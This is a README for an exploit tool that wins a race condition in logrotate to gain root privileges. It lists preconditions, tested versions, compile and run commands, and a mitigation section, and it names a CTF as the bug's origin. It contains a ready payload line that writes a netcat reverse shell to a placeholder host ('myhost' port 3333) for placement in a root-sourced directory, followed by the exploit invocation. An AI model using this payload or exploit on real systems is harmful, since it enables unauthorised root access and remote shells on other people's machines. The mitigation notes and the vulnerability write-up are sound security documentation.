# Winning a race condition in logrotate to elevate privileges

## Brief description
  - logrotate is prone to a race condition vulnerability when it's exectued with
    "create"-option.
  - If logrotate is executed as root, with the "create"-option and the user
    is in control of the logfile path, it is possible to abuse a race-condition 
    to write files in ANY directories.
  - An attacker could elevate his privileges by writing reverse-shells into 
    directories like "/etc/bash_completition.d/".
  - This vulnerability was found during a challenge at the 35c3 CTF 
    ( https://ctftime.org/event/718 )
  - A detailed description and a PoC of this challenge was written by the 
  - nsogroup ( https://blog.nsogroup.com/logrotate-zajebiste-500-points/ )
 
## Precondition for privilege escalation
  - Logrotate has to be executed as root
  - The logpath needs to be in control of the attacker
  - "create" option is set in the logrotate configuration

## Tested version
  - Debian GNU/Linux 9.5 (stretch)
  - Amazon Linux 2 AMI (HVM)
  - Ubuntu 18.04.1
  - logrotate 3.8.6
  - logrotate 3.11.0
  - logrotate 3.15.0

## Compile
  - gcc -o logrotten logrotten.c

## Prepare payload
```
echo "if [ `id -u` -eq 0 ]; /bin/nc -e /bin/bash myhost 3333 &; fi" > payloadfile
```

## Run exploit
```
nice -n -20 ./logrotten /tmp/log/pwnme.log payloadfile
```
## Known Problems
  - It's hard to win the race inside a docker container

## Mitigation
  - make sure that logpath is owned by root
  - or use option "nocreate"

## Author
  - Wolfgang Hotwagner

## Contact
  - https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges
  - https://github.com/whotwagner/logrotten

